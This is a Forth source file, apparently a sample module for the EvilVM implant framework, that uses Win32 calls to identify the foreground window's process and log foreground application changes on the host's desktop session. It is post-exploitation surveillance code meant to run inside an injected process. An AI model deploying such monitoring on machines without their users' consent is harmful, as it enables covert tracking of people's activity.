\ require exceptions.fth

\ 
\ This sample implements some functionality for obtaining and monitoring
\ the the foreground application for the windows desktop.  This code
\ must be run from a process with access to a desktop session, so take
\ care where EvilVM is injected.
\
\ 

{ ." 

  foreground.fth
  
  Observe the foreground window, and provide facility to monitor
  the foreground activity of the current desktop session.
  
  Run foreground to see the current foreground application.
  Run monitor-fg to log changes in foreground over time.
  Use @foreground to get a pointer to a cstring with the current name.

" ETX emit }!

private

\ We need functions from these two DLLs
loadlib user32.dll
value user32

loadlib psapi.dll
value psapi

\ Import functions from Win32 DLLs
user32 0 dllfun GetForegroundWindow GetForegroundWindow
user32 2 dllfun GetWindowThreadProcessId GetWindowThreadProcessId
kernel32 3 dllfun OpenProcess OpenProcess
psapi 4 dllfun GetModuleFileNameExA GetModuleFileNameExA

0 value window  \ a handle to a window
0 value proc     \ a handle to open a process to get its module name

\ Allocate some local memory
variable pid
create filename 1024 allot  \ store a module path 
create previous 1024 allot   \ keep two around, so we can spot changes

\ The Win32 part of what we do; always looks ugly.  I'm writing this in
\ an exception handling style to avoid ugly conditionals.

: foreground
  try
    \ get a handle to the current foreground window
    '{ GetForegroundWindow [to] window }' '{ window CloseHandle drop }'
    attempt window +assert

    \ get the PID that owns that window
    window pid GetWindowThreadProcessId +assert

    \ open a handle to that process
    '{ $1000 0 pid @ OpenProcess [to] proc }' '{ proc CloseHandle drop }' 
    attempt proc +assert

    \ fill the 'filename' buffer with the process image name
    proc 0 filename 1024 GetModuleFileNameExA +assert

  ensure
    cleanup
  done
;

\ Now for the Forth-ish UI layer for providing useful foreground application
\ words for the EvilVM environment.

: backup-name   filename previous 1024 move ;
: different?    filename previous cstrcmp ;
: .filename     @time .time pid @ . filename .cstring cr ;
: .maybe?       different? if backup-name .filename then ;

: quit?         key? if key [char] q = else 0 then ;
: monitor-fg    quit? if .post else foreground .maybe? 5000 ms tail then ;

: .header       ." Monitoring foreground applications\n"
		." enter 'q' to terminate loop\n" ;

public{

\ Public interface -- distill everything to two commands that should
\ be handy for the user.

: @foreground   foreground filename ;
: foreground    foreground .pre .filename .post ;
: monitor-fg    .pre .header monitor-fg ; 

}public
